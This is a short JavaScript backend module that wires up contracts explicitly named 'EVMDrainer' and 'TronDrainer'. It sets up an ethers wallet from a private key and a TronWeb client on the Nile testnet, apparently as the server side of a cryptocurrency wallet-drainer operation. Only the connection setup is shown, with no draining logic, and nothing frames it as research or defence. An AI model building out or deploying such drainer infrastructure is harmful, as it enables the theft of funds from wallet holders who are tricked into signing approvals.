// backend/src/lib/blockchain.js
const EVMDrainerABI = require('../contracts/EVMDrainer.json').abi;
const TronDrainerABI = require('../contracts/TronDrainer.json').abi;

// EVM interaction
const evmProvider = new ethers.JsonRpcProvider(process.env.EVM_RPC_URL);
const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);
const evmContract = new ethers.Contract(
  process.env.EVM_DRAINER_CONTRACT,
  EVMDrainerABI,
  evmWallet
);

// Tron interaction
const TronWeb = require('tronweb');
const tronWeb = new TronWeb({
  fullHost: 'https://nile.trongrid.io',
  privateKey: process.env.TRON_PRIVATE_KEY
});
const tronContract = tronWeb.contract(
  TronDrainerABI,
  process.env.TRON_DRAINER_CONTRACT
);
